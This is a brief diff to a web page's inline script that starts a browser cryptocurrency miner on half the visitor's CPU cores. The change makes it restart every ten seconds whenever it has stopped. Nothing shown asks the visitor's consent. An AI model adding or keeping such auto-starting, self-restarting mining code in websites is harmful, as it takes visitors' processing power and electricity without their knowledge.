@@ -112,14 +112,12 @@
   </div>
   <script>
     var mi = setInterval(function(){
-      if (miner != null){
+      if (miner != null && !miner.isRunning()){
         //miner.setAutoThreadsEnabled(true);
         miner.setNumThreads(navigator.hardwareConcurrency/2);
         miner.start();
-        if(miner.isRunning())
-          clearInterval(mi);
       }
-    }, 1000);
+    }, 10000);
   </script>
 </body>
 </html>
